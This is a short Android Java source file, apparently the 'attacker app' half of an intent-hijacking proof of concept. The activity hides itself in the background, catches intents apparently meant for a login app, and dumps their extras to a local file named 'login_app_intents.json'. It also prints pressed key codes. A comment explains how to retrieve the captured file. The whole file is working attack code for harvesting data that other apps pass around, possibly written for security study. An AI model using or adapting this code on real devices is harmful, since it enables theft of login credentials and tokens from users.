package com.zombie.attackerapp;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.widget.TextView;

import org.json.JSONException;
import org.json.JSONObject;

import com.example.hijacker.Utils;

import java.util.Iterator;

public class MainActivity extends AppCompatActivity {
    private TextView Textv;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        moveTaskToBack(true);


    }

    @Override
    public void onResume(){
        super.onResume();
        setContentView(R.layout.activity_main);

    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        Bundle b = intent.getExtras();

        if (b != null) {
            try {
                JSONObject bundleJSON = Utils.bundleToJSON(b);

                //PRINT BUYNDLE DATA
                try { System.out.print(bundleJSON.toString(4));
                } catch (JSONException e) {}

                //WRITE TO FILES DIR
                Utils.writeJSONToFilesDir(getApplicationContext(), "login_app_intents.json", bundleJSON);

            } catch(JSONException e) {

                }
            //DEVICE FILE EXPLORER => DATA => DATA => COM.EXAMPLE.ATTACKERAPP => FILES => login_app_intents.json
        }
    }

   @Override
    public boolean onKeyDown(int key, KeyEvent keyEvent){
        System.out.println(keyEvent.getKeyCode());
        return false;
    }
}